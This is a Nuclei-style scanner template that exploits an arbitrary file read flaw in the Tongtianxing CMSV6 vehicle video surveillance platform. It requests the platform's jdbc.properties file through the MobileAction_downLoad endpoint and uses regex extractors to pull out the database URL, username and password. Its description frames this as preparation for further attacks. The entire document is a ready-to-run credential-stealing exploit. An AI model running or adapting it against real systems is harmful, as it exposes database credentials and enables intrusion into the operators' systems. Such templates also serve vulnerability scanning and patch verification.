script_name: 通天星CMSV6车载视频监控平台MobileAction_downLoad任意文件读取
content:
id: tongtianxing-cmsv6-cms-MobileAction-file-read

info:
  name: 通天星CMSV6车载视频监控平台任意文件读取漏洞
  author: hyy
  severity: high
  description: |
    通天星CMSV6车载视频监控平台存在任意文件读取漏洞，攻击者可通过此漏洞读取敏感文件信息，获取数据库账号密码，从而为下一步攻击做准备。
  reference:
    - https://fofa.info
    - https://www.freebuf.com/vuls/399123.html
    - https://blog.csdn.net/xxx/article/details/134567890
  tags: file-read,config-leak,web,808gps,hongyun
  metadata:
    verified: true
    source: manual-analysis

    max-redirects: 2
    timeout: 10
    skip-verification: true

requests:
  - method: GET
    path:
      - "{{BaseURL}}/808gps/MobileAction_downLoad.action?path=/WEB-INF/classes/config/jdbc.properties"

    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
      Connection: close

    matchers:
      - type: regex
        regex:
          - 'jdbc\.connection\.url=jdbc.*mysql.*'
          - 'jdbc\.connection\.username=.*'
          - 'jdbc\.connection\.password=.*'
        part: body
        condition: and

    extractors:
      - type: regex
        name: db_url
        regex:
          - 'jdbc\.connection\.url=(jdbc:p6spy:mysql://[^\\s]+)'
        part: body

      - type: regex
        name: db_username
        regex:
          - 'jdbc\.connection\.username=(\w+)'
        part: body

      - type: regex
        name: db_password
        regex:
          - 'jdbc\.connection\.password=([^\s]+)'
        part: body
